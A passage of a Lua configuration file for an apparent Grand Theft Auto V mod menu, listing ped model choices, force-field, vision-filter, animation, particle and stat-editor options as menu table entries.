'csb_denise_friend', 'csb_dix', 'csb_djblamadon', 'csb_englishdave', 'csb_fos_rep', 'csb_g', 'csb_groom', 'csb_grove_str_dlr', 'csb_hao', 'csb_hugh', 'csb_imran', 'csb_jackhowitzer', 'csb_janitor', 'csb_maude', 'csb_money', 'csb_mp_agent14', 'csb_mrs_r', 'csb_mweather', 'csb_ortega', 'csb_oscar', 'csb_paige', 'csb_popov', 'csb_porndudes', 'csb_prologuedriver', 'csb_prolsec', 'csb_ramp_gang', 'csb_ramp_hic', 'csb_ramp_hipster', 'csb_ramp_marine', 'csb_ramp_mex', 'csb_rashcosvki', 'csb_reporter', 'csb_roccopelosi', 'csb_screen_writer', 'csb_sol', 'csb_stripper_01', 'csb_stripper_02', 'csb_talcc', 'csb_talmm', 'csb_tonya', 'csb_tonyprince', 'csb_trafficwarden', 'csb_undercover', 'csb_vagspeak', 'csb_agatha', 'csb_avery', 'csb_brucie2', 'csb_thornton', 'csb_tomcasino', 'csb_vincent'}},
            {text = 'Gang female', dkey = 'player:model_gangfemale', desc = 'Choose a ped model from the gang\nfemale category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Gang female ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'g_f_importexport_01', 'g_f_y_ballas_01', 'g_f_y_families_01', 'g_f_y_lost_01', 'g_f_y_vagos_01'}},
            {text = 'Gang male', dkey = 'player:model_gangmale', desc = 'Choose a ped model from the gang\nmale category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Gang male ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'g_m_importexport_01', 'g_m_m_armboss_01', 'g_m_m_armgoon_01', 'g_m_m_armlieut_01', 'g_m_m_chemwork_01', 'g_m_m_chiboss_01', 'g_m_m_chicold_01', 'g_m_m_chigoon_01', 'g_m_m_chigoon_02', 'g_m_m_korboss_01', 'g_m_m_mexboss_01', 'g_m_m_mexboss_02', 'g_m_y_armgoon_02', 'g_m_y_azteca_01', 'g_m_y_ballaeast_01', 'g_m_y_ballaorig_01', 'g_m_y_ballasout_01', 'g_m_y_famca_01', 'g_m_y_famdnf_01', 'g_m_y_famfor_01', 'g_m_y_korean_01', 'g_m_y_korean_02', 'g_m_y_korlieut_01', 'g_m_y_lost_01', 'g_m_y_lost_02', 'g_m_y_lost_03', 'g_m_y_mexgang_01', 'g_m_y_mexgoon_01', 'g_m_y_mexgoon_02', 'g_m_y_mexgoon_03', 'g_m_y_pologoon_01', 'g_m_y_pologoon_02', 'g_m_y_salvaboss_01', 'g_m_y_salvagoon_01', 'g_m_y_salvagoon_02', 'g_m_y_salvagoon_03', 'g_m_y_strpunk_01', 'g_m_y_strpunk_02', 'g_m_m_casrn_01'}},
            {text = 'Multiplayer', dkey = 'player:model_multiplayer', desc = 'Choose a ped model from the\nmultiplayer category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Multiplayer ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'mp_f_bennymech_01', 'mp_f_boatstaff_01', 'mp_f_cardesign_01', 'mp_f_chbar_01', 'mp_f_cocaine_01', 'mp_f_counterfeit_01', 'mp_f_deadhooker', 'mp_f_execpa_01', 'mp_f_execpa_02', 'mp_f_forgery_01', 'mp_f_freemode_01', 'mp_f_helistaff_01', 'mp_f_meth_01', 'mp_f_misty_01', 'mp_f_stripperlite', 'mp_f_weed_01', 'mp_g_m_pros_01', 'mp_m_avongoon', 'mp_m_boatstaff_01', 'mp_m_bogdangoon', 'mp_m_claude_01', 'mp_m_cocaine_01', 'mp_m_counterfeit_01', 'mp_m_exarmy_01', 'mp_m_execpa_01', 'mp_m_famdd_01', 'mp_m_fibsec_01', 'mp_m_forgery_01', 'mp_m_freemode_01', 'mp_m_g_vagfun_01', 'mp_m_freemode_01', 'mp_m_meth_01', 'mp_m_niko_01', 'mp_m_securoguard_01', 'mp_m_shopkeep_01', 'mp_m_waremech_01', 'mp_m_weapexp_01', 'mp_m_weapwork_01', 'mp_m_weed_01', 'mp_s_m_armoured_01'}},
            {text = 'Scenario female', dkey = 'player:model_scenariofemale', desc = 'Choose a ped model from the\nscenario female category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Scenario female model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'s_f_m_fembarber','s_f_m_fembarber','s_f_m_maid_01','s_f_m_maid_01','s_f_m_shop_high','s_f_m_shop_high','s_f_m_sweatshop_01','s_f_m_sweatshop_01','s_f_y_airhostess_01','s_f_y_airhostess_01','s_f_y_bartender_01','s_f_y_bartender_01','s_f_y_baywatch_01','s_f_y_baywatch_01','s_f_y_clubbar_01','s_f_y_clubbar_01','s_f_y_cop_01','s_f_y_cop_01','s_f_y_factory_01','s_f_y_factory_01','s_f_y_hooker_01','s_f_y_hooker_01','s_f_y_hooker_02','s_f_y_hooker_02','s_f_y_hooker_03','s_f_y_hooker_03','s_f_y_migrant_01','s_f_y_migrant_01','s_f_y_movprem_01','s_f_y_movprem_01','s_f_y_ranger_01','s_f_y_ranger_01','s_f_y_scrubs_01','s_f_y_scrubs_01','s_f_y_sheriff_01','s_f_y_sheriff_01','s_f_y_shop_low','s_f_y_shop_low','s_f_y_shop_mid','s_f_y_shop_mid','s_f_y_stripper_01','s_f_y_stripper_01','s_f_y_stripper_02','s_f_y_stripper_02','s_f_y_stripperlite','s_f_y_stripperlite','s_f_y_sweatshop_01','s_f_y_sweatshop_01'}},
            {text = 'Scenario male', dkey = 'player:model_scenariomale', desc = 'Choose a ped model from the\nscenario male category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Scenario male ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'s_m_m_ammucountry', 's_m_m_armoured_01', 's_m_m_armoured_02', 's_m_m_autoshop_01', 's_m_m_autoshop_02', 's_m_m_bouncer_01', 's_m_m_ccrew_01', 's_m_m_chemsec_01', 's_m_m_ciasec_01', 's_m_m_cntrybar_01', 's_m_m_dockwork_01', 's_m_m_doctor_01', 's_m_m_fiboffice_01', 's_m_m_fiboffice_02', 's_m_m_fibsec_01', 's_m_m_gaffer_01', 's_m_m_gardener_01', 's_m_m_gentransport', 's_m_m_hairdress_01', 's_m_m_highsec_01', 's_m_m_highsec_02', 's_m_m_janitor', 's_m_m_lathandy_01', 's_m_m_lifeinvad_01', 's_m_m_linecook', 's_m_m_lsmetro_01', 's_m_m_mariachi_01', 's_m_m_marine_01', 's_m_m_marine_02', 's_m_m_migrant_01', 's_m_m_movalien_01', 's_m_m_movprem_01', 's_m_m_movspace_01', 's_m_m_paramedic_01', 's_m_m_pilot_01', 's_m_m_pilot_02', 's_m_m_postal_01', 's_m_m_postal_02', 's_m_m_prisguard_01', 's_m_m_scientist_01', 's_m_m_security_01', 's_m_m_snowcop_01', 's_m_m_strperf_01', 's_m_m_strpreach_01', 's_m_m_strvend_01', 's_m_m_trucker_01', 's_m_m_ups_01', 's_m_m_ups_02', 's_m_o_busker_01', 's_m_y_airworker', 's_m_y_ammucity_01', 's_m_y_armymech_01', 's_m_y_autopsy_01', 's_m_y_barman_01', 's_m_y_baywatch_01', 's_m_y_blackops_01', 's_m_y_blackops_02', 's_m_y_blackops_03', 's_m_y_busboy_01', 's_m_y_chef_01', 's_m_y_clown_01', 's_m_y_clubbar_01', 's_m_y_construct_01', 's_m_y_construct_02', 's_m_y_cop_01', 's_m_y_dealer_01', 's_m_y_devinsec_01', 's_m_y_dockwork_01', 's_m_y_doorman_01', 's_m_y_dwservice_01', 's_m_y_dwservice_02', 's_m_y_factory_01', 's_m_y_fireman_01', 's_m_y_garbage', 's_m_y_grip_01', 's_m_y_hwaycop_01', 's_m_y_marine_01', 's_m_y_marine_02', 's_m_y_marine_03', 's_m_y_mime', 's_m_y_pestcont_01', 's_m_y_pilot_01', 's_m_y_prismuscl_01', 's_m_y_prisoner_01', 's_m_y_ranger_01', 's_m_y_robber_01', 's_m_y_sheriff_01', 's_m_y_shop_mask', 's_m_y_strvend_01', 's_m_y_swat_01', 's_m_y_uscg_01', 's_m_y_valet_01', 's_m_y_waiter_01', 's_m_y_waretech_01', 's_m_y_winclean_01', 's_m_y_xmech_01', 's_m_y_xmech_02', 's_m_y_casino_01','s_m_y_westsec_01'}},
            {text = 'Story', dkey = 'player:model_story', desc = 'Choose a ped model from the story\ncategory.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Story ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'hc_driver', 'hc_gunman', 'hc_hacker', 'ig_abigail', 'ig_agent', 'ig_amandatownley', 'ig_andreas', 'ig_ashley', 'ig_avon', 'ig_ballasog', 'ig_bankman', 'ig_barry', 'ig_benny', 'ig_bestmen', 'ig_beverly', 'ig_brad', 'ig_bride', 'ig_car3guy1', 'ig_car3guy2', 'ig_casey', 'ig_chef', 'ig_chef2', 'ig_chengsr', 'ig_chrisformage', 'ig_clay', 'ig_claypain', 'ig_cletus', 'ig_dale', 'ig_davenorton', 'ig_denise', 'ig_devin', 'ig_dix', 'ig_djblamadon', 'ig_djblamrupert', 'ig_djblamryans', 'ig_djdixmanager', 'ig_djgeneric_01', 'ig_djsolfotios', 'ig_djsoljakob', 'ig_djsolmanager', 'ig_djsolmike', 'ig_djsolrobt', 'ig_djtalaurelia', 'ig_djtalignazio', 'ig_dom', 'ig_dreyfuss', 'ig_drfriedlander', 'ig_englishdave', 'ig_fabien', 'ig_fbisuit_01', 'ig_floyd', 'ig_g', 'ig_groom', 'ig_hao', 'ig_hunter', 'ig_janet', 'ig_jay_norris', 'ig_jewelass', 'ig_jimmyboston', 'ig_jimmyboston_02', 'ig_jimmydisanto', 'ig_joeminuteman', 'ig_johnnyklebitz', 'ig_josef', 'ig_josh', 'ig_karen_daniels', 'ig_kerrymcintosh', 'ig_kerrymcintosh_02', 'ig_lacey_jones_02', 'ig_lamardavis', 'ig_lazlow', 'ig_lazlow_2', 'ig_lestercrest', 'ig_lestercrest_2', 'ig_lifeinvad_01', 'ig_lifeinvad_02', 'ig_magenta', 'ig_malc', 'ig_manuel', 'ig_marnie', 'ig_maryann', 'ig_maude', 'ig_michelle', 'ig_milton', 'ig_molly', 'ig_money', 'ig_mp_agent14', 'ig_mrk', 'ig_mrs_thornhill', 'ig_mrsphillips', 'ig_natalia', 'ig_nervousron', 'ig_nigel', 'ig_old_man1a', 'ig_old_man2', 'ig_omega', 'ig_oneil', 'ig_orleans', 'ig_ortega', 'ig_paige', 'ig_paper', 'ig_patricia', 'ig_popov', 'ig_priest', 'ig_prolsec_02', 'ig_ramp_gang', 'ig_ramp_hic', 'ig_ramp_hipster', 'ig_ramp_mex', 'ig_rashcosvki', 'ig_roccopelosi', 'ig_russiandrunk', 'ig_sacha', 'ig_screen_writer', 'ig_siemonyetarian', 'ig_sol', 'ig_solomon', 'ig_stevehains', 'ig_stretch', 'ig_talcc', 'ig_talina', 'ig_talmm', 'ig_tanisha', 'ig_taocheng', 'ig_taostranslator', 'ig_tenniscoach', 'ig_terry', 'ig_tomepsilon', 'ig_tonya', 'ig_tonyprince', 'ig_tracydisanto', 'ig_trafficwarden', 'ig_tylerdix', 'ig_tylerdix_02', 'ig_vagspeak', 'ig_wade', 'ig_zimbor', 'player_one', 'player_two', 'player_zero', 'ig_agatha', 'ig_avery', 'ig_brucie2', 'ig_thornton', 'ig_tomcasino','ig_vincent'}},
            {text = 'Story scenario female', dkey = 'player:model_storyscenariofemale', desc = 'Choose a ped model from the story\nscenario female category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Story scenario female ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'u_f_m_corpse_01', 'u_f_m_miranda', 'u_f_m_miranda_02', 'u_f_m_promourn_01', 'u_f_o_moviestar', 'u_f_o_prolhost_01', 'u_f_y_bikerchic', 'u_f_y_comjane', 'u_f_y_corpse_01', 'u_f_y_corpse_02', 'u_f_y_danceburl_01', 'u_f_y_dancelthr_01', 'u_f_y_dancerave_01', 'u_f_y_hotposh_01', 'u_f_y_jewelass_01', 'u_f_y_mistress', 'u_f_y_poppymich', 'u_f_y_poppymich_02', 'u_f_y_princess', 'u_f_y_spyactress', 'u_f_m_casinocash_01', 'u_f_m_casinoshop_01', 'u_f_m_debbie_01', 'u_f_o_carol', 'u_f_o_eileen', 'u_f_y_beth', 'u_f_y_lauren', 'u_f_y_taylor'}},
            {text = 'Story scenario male', dkey = 'player:model_storyscenariomale', desc = 'Choose a ped model from the story\nscenario male category.', afu = __REAPER1__.M.player.model.modelchange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Story scenario male ped model', length = 50, tipus = 'vegyes', menuextra = 'image_model', func = {'u_m_m_aldinapoli', 'u_m_m_bankman', 'u_m_m_bikehire_01', 'u_m_m_doa_01', 'u_m_m_edtoh', 'u_m_m_fibarchitect', 'u_m_m_filmdirector', 'u_m_m_glenstank_01', 'u_m_m_griff_01', 'u_m_m_jesus_01', 'u_m_m_jewelsec_01', 'u_m_m_jewelthief', 'u_m_m_markfost', 'u_m_m_partytarget', 'u_m_m_prolsec_01', 'u_m_m_promourn_01', 'u_m_m_rivalpap', 'u_m_m_spyactor', 'u_m_m_streetart_01', 'u_m_m_willyfist', 'u_m_o_filmnoir', 'u_m_o_finguru_01', 'u_m_o_taphillbilly', 'u_m_o_tramp_01', 'u_m_y_abner', 'u_m_y_antonb', 'u_m_y_babyd', 'u_m_y_baygor', 'u_m_y_burgerdrug_01', 'u_m_y_chip', 'u_m_y_corpse_01', 'u_m_y_cyclist_01', 'u_m_y_danceburl_01', 'u_m_y_dancelthr_01', 'u_m_y_dancerave_01', 'u_m_y_fibmugger_01', 'u_m_y_guido_01', 'u_m_y_gunvend_01', 'u_m_y_hippie_01', 'u_m_y_imporage', 'u_m_y_juggernaut_01', 'u_m_y_justin', 'u_m_y_mani', 'u_m_y_militarybum', 'u_m_y_paparazzi', 'u_m_y_party_01', 'u_m_y_pogo_01', 'u_m_y_prisoner_01', 'u_m_y_proldriver_01', 'u_m_y_rsranger_01', 'u_m_y_sbike', 'u_m_y_smugmech_01', 'u_m_y_staggrm_01', 'u_m_y_tattoo_01', 'u_m_y_zombie_01', 'u_m_m_blane', 'u_m_m_curtis', 'u_m_m_vince', 'u_m_o_dean', 'u_m_y_caleb', 'u_m_y_croupthief_01', 'u_m_y_gabriel', 'u_m_y_ushi'}},
        },
    
        ['player:forcefield'] = {
            {text = 'Force field', dkey = 'player:forcefield_forcefield', desc = 'Enable your force field.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Range', dkey = 'player:forcefield_range', desc = 'Set the range of your force field.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Range number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Type', dkey = 'player:forcefield_type', desc = 'Choose the type of your force field.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Force field type', length = 10, tipus = 'betu', func = {'Ragdoll', 'Shockwave'}},
            {text = 'Explode', dkey = 'player:forcefield_explode', desc = 'Enable so shit will explode on touch\nas well.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion name', length = 20, tipus = 'betu', toggle = false, func = __REAPER1__.T.Explosions},
            {text = 'Pedestrians', dkey = 'player:forcefield_pedestrian', desc = 'Include pedestrians.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicles', dkey = 'player:forcefield_vehicle', desc = 'Include vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Draw range', dkey = 'player:forcefield_drawindicator', desc = 'Draw the range of your force field.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Range color', dkey = 'player:forcefield_rangecolor', desc = 'Set the color and alpha of the range.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Range color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['player:vision'] = {
            {text = 'Vision strentgth', dkey = 'player:vision_visionstrength', desc = 'Set the vision strength.', afu = __REAPER1__.M.player.vision.setvisionstrength, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vision strength number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Vision types', option = __REAPER1__.M.Separator},
            {text = 'Default', dkey = 'player:vision_default', desc = 'Default vision.', afu = __REAPER1__.M.player.vision.default, extra = 'default', option = __REAPER1__.M.Button},
            {text = 'Night vision', dkey = 'player:vision_default', desc = 'Default vision.', afu = __REAPER1__.M.player.vision.nightvision, option = __REAPER1__.M.Button},
            {text = 'Thermal vision', dkey = 'player:vision_thermal', desc = 'Thermal vision.', afu = __REAPER1__.M.player.vision.thermal, option = __REAPER1__.M.Button},
            {text = 'No fog', dkey = 'player:vision_nofog', desc = 'No fog vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'INT_NO_fogALPHA', option = __REAPER1__.M.Button},
            {text = 'No fog dark', dkey = 'player:vision_nofogdark', desc = 'No fog dark vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'cinema', option = __REAPER1__.M.Button},
            {text = 'Lit black', dkey = 'player:vision_alwayslitb', desc = 'Lit black vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'mp_gr_int01_black', option = __REAPER1__.M.Button},
            {text = 'Lit grey', dkey = 'player:vision_alwayslitg', desc = 'Lit grey vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'mp_gr_int01_grey', option = __REAPER1__.M.Button},
            {text = 'Lit white', dkey = 'player:vision_alwayslitw', desc = 'Lit white vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'mp_gr_int01_white', option = __REAPER1__.M.Button},
            {text = 'White glowing', dkey = 'player:vision_whitepeds', desc = 'White gklowing peds vision.', afu = __REAPER1__.M.player.vision.setsecvision, extra = 'mp_lad_day', option = __REAPER1__.M.Button},
            {text = 'Red glowing', dkey = 'player:vision_redpeds', desc = 'Red glowing peds vision.', afu = __REAPER1__.M.player.vision.setsecvision, extra = 'mp_lad_night', option = __REAPER1__.M.Button},
            {text = 'Yellow glowing', dkey = 'player:vision_yellowpeds', desc = 'Yellow glowing peds vision.', afu = __REAPER1__.M.player.vision.setsecvision, extra = 'mp_lad_judgment', option = __REAPER1__.M.Button},
            {text = 'Underwater', dkey = 'player:vision_underwater', desc = 'Underwater vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'underwater', option = __REAPER1__.M.Button},
            {text = 'Prologue', dkey = 'player:vision_prologue', desc = 'Prologue vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'prologue', option = __REAPER1__.M.Button},
            {text = 'Cops', dkey = 'player:vision_cops', desc = 'Cops vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'cops', option = __REAPER1__.M.Button},
            {text = 'Damage', dkey = 'player:vision_damage', desc = 'Damage vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'damage', option = __REAPER1__.M.Button},
            {text = 'Dying', dkey = 'player:vision_dying', desc = 'Dying vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'dying', option = __REAPER1__.M.Button},
            {text = 'Pulse', dkey = 'player:vision_pulse', desc = 'Pulse vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'pulse', option = __REAPER1__.M.Button},
            {text = 'Ufo', dkey = 'player:vision_ufo', desc = 'Ufo vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'ufo', option = __REAPER1__.M.Button},
            {text = 'Epsilion', dkey = 'player:vision_epsilon', desc = 'Epsilon vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'epsilion', option = __REAPER1__.M.Button},
            {text = 'Chop', dkey = 'player:vision_chop', desc = 'Chop vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'CHOP', option = __REAPER1__.M.Button},
            {text = 'Dark', dkey = 'player:vision_dark', desc = 'Dark vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'v_dark', option = __REAPER1__.M.Button},
            {text = 'Torture', dkey = 'player:vision_torture', desc = 'Torture vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'v_torture', option = __REAPER1__.M.Button},
            {text = 'Secret camera', dkey = 'player:vision_secretcam', desc = 'Secret camera vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'secret_camera', option = __REAPER1__.M.Button},
            {text = 'Mugshot', dkey = 'player:vision_mugshot', desc = 'Mugshot vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'mugShot', option = __REAPER1__.M.Button},
            {text = 'Contrast', dkey = 'player:vision_contrast', desc = 'Contrast vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'MP_Killstreak', option = __REAPER1__.M.Button},
            {text = 'Kifflom', dkey = 'player:vision_kifflom', desc = 'Kifflom vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'Kifflom', option = __REAPER1__.M.Button},
            {text = 'Forest', dkey = 'player:vision_forest', desc = 'Forest vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'Forest', option = __REAPER1__.M.Button},
            {text = 'Bloom', dkey = 'player:vision_bloom', desc = 'Bloom vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'Bloom', option = __REAPER1__.M.Button},
            {text = 'Air boost', dkey = 'player:vision_airboost', desc = 'Air boost vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'AirRaceBoost01', option = __REAPER1__.M.Button},
            {text = 'White out', dkey = 'player:vision_whiteout', desc = 'White out vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'WhiteOut', option = __REAPER1__.M.Button},
            {text = 'Black and white', dkey = 'player:vision_blackandwhite', desc = 'Black and white vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'blackNwhite', option = __REAPER1__.M.Button},
            {text = 'Hint cam', dkey = 'player:vision_hintcam', desc = 'Hint camvision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'Hint_cam', option = __REAPER1__.M.Button},
            {text = 'Dark blue', dkey = 'player:vision_darkblue', desc = 'Dark blue vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_Darkblue', option = __REAPER1__.M.Button},
            {text = 'Gray', dkey = 'player:vision_gray', desc = 'Gray vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_VISOR', option = __REAPER1__.M.Button},
            {text = 'Black', dkey = 'player:vision_black', desc = 'Black vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_black', option = __REAPER1__.M.Button},
            {text = 'Blue', dkey = 'player:vision_blue', desc = 'Blue vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_blue', option = __REAPER1__.M.Button},
            {text = 'Brown', dkey = 'player:vision_brown', desc = 'Brown vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_brown', option = __REAPER1__.M.Button},
            {text = 'Green', dkey = 'player:vision_green', desc = 'Green vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_green', option = __REAPER1__.M.Button},
            {text = 'Orange', dkey = 'player:vision_orange', desc = 'Orange vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_orange', option = __REAPER1__.M.Button},
            {text = 'Pink', dkey = 'player:vision_pink', desc = 'Pink vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_pink', option = __REAPER1__.M.Button},
            {text = 'Purple', dkey = 'player:vision_purple', desc = 'Purple vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_purple', option = __REAPER1__.M.Button},
            {text = 'Red', dkey = 'player:vision_red', desc = 'Red vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_red', option = __REAPER1__.M.Button},
            {text = 'Yellow', dkey = 'player:vision_yellow', desc = 'Yellow vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'glasses_yellow', option = __REAPER1__.M.Button},
            {text = 'Spectator 1', dkey = 'player:vision_spectator1', desc = 'Spectator 1 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator1', option = __REAPER1__.M.Button},
            {text = 'Spectator 2', dkey = 'player:vision_spectator2', desc = 'Spectator 2 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator2', option = __REAPER1__.M.Button},
            {text = 'Spectator 3', dkey = 'player:vision_spectator3', desc = 'Spectator 3 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator3', option = __REAPER1__.M.Button},
            {text = 'Spectator 4', dkey = 'player:vision_spectator4', desc = 'Spectator 4 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator4', option = __REAPER1__.M.Button},
            {text = 'Spectator 5', dkey = 'player:vision_spectator5', desc = 'Spectator 5 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator5', option = __REAPER1__.M.Button},
            {text = 'Spectator 6', dkey = 'player:vision_spectator6', desc = 'Spectator 6 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator6', option = __REAPER1__.M.Button},
            {text = 'Spectator 7', dkey = 'player:vision_spectator7', desc = 'Spectator 7 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator7', option = __REAPER1__.M.Button},
            {text = 'Spectator 8', dkey = 'player:vision_spectator8', desc = 'Spectator 8 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator8', option = __REAPER1__.M.Button},
            {text = 'Spectator 9', dkey = 'player:vision_spectator9', desc = 'Spectator 9 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator9', option = __REAPER1__.M.Button},
            {text = 'Spectator 10', dkey = 'player:vision_spectator10', desc = 'Spectator 10 vision.', afu = __REAPER1__.M.player.vision.setvision, extra = 'spectator10', option = __REAPER1__.M.Button},
        },
    
        ['player:animation'] = {
            {text = 'Anim dict', dkey = 'player:animation_animdict', desc = 'Set the animation dictionary.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Animation dictionary', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Animation', dkey = 'player:animation_animation', desc = 'Play an animation.', afu = __REAPER1__.M.player.animation.animation, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Animation name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Stop animations', dkey = 'player:animation_stopanimation', desc = 'Stop all the ongoing animations.', afu = __REAPER1__.M.player.animation.stopanimation, option = __REAPER1__.M.Button},
            {text = 'Moveable', dkey = 'player:animation_moveable', desc = 'If enabled you can move while the\nanim is playing.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Looped', dkey = 'player:animation_looped', desc = 'If enabled the animation won\'t stop\nplaying.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Fuck up', dkey = 'player:animation_fuckup', desc = 'Look like a glitch.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Duration', dkey = 'player:animation_duration', desc = 'Set the duration of an animation.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation duration number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Scenario', dkey = 'player:animation_scenario', desc = 'Play a scenarop.', afu = __REAPER1__.M.player.animation.scenario, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Scenario name', length = 50, tipus = 'vegyes', func = 'None'},
            {text = 'Walk style', dkey = 'player:animation_walkstyle', desc = 'Set your walk style.', afu = __REAPER1__.M.player.animation.walkstyle, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Walk style name', length = 50, tipus = 'vegyes', func = 'None'},
        },

        ['player:particle'] = {
            {text = 'Play particle', dkey = 'player:particle_playparticle', desc = 'Play a particle.', afu = __REAPER1__.M.player.particle.playparticle, option = __REAPER1__.M.Button},
            {text = 'Loop particle', dkey = 'player:particle_loopparticle', desc = 'Loop playing a particle.', afu = __REAPER1__.M.player.particle.loopparticle, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Particle', dkey = 'player:particle_particle', desc = 'Select the particle.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle name', length = 50, tipus = 'vegyes', func = __REAPER1__.T.MParticles},
            {text = 'Scale', dkey = 'player:particle_scale', desc = 'The scale of the particle.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle scale number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Delay', dkey = 'player:particle_delay', desc = 'Delay between played particles.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Particle delay number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Rotation', dkey = 'player:particle_rotation', desc = 'Directions in 3d for rotation of the\nparticle.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Rotation numbers', length = 50, tipus = 'vegyes', func = '0.0 0.0 0.0'},
            {text = 'Axis', dkey = 'player:particle_axis', desc = 'Directions in 3d for the axis of the\nparticle.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Axis numbers', length = 50, tipus = 'vegyes', func = '0.0 0.0 0.0'},
        },
    
        ['player:stateditor'] = {
            {text = 'Strength capacity', dkey = 'player:stateditor_strength', desc = 'Set your strength capacity.', afu = __REAPER1__.M.player.stateditor.strength, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Strength capacity number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
